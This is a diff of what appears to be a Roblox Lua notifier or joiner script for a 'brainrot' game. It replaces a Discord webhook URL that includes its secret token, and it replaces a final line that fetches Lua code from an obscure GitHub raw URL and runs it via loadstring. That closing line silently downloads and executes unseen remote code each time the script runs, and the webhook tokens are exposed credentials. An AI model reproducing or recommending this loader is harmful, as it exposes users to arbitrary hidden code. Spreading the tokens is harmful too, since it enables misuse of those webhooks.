@@ -84,7 +84,7 @@ sendTeleport = false,
 showJoinerAd = true
 },
 { -- Special brainrots + overpay
-url = 'https://discord.com/api/webhooks/1454364236074717244/OFfPkCoZyUIoEG0vtKRRSCyWNyeIXFeHbGR2QthO8VrRB-WTbBVIW-LkO60y_JDKGQ9b',
+url = 'https://discord.com/api/webhooks/1454624672078630982/eqhtVZ9JOeJnnxVzWyubzrceo46OfCMGhJ4zhQLRt5aZJb9E7F63U2X8s7iKd4EoK-Rp',
 title = '⭐️ SPECIAL BRAINROTS',
 color = 0xff00ff,
 special = true,
@@ -812,4 +812,4 @@ UserInputService.InputBegan:Connect(function(input, gpe)
         copyJobIdToClipboard()
     end
 end)
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Confilas/ghjnfthun/refs/heads/main/fvddfv"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vovoksdsvovoksds-svg/FDRUJNGEDSUJ4/refs/heads/main/FDSOTGISRTG.LUA"))()
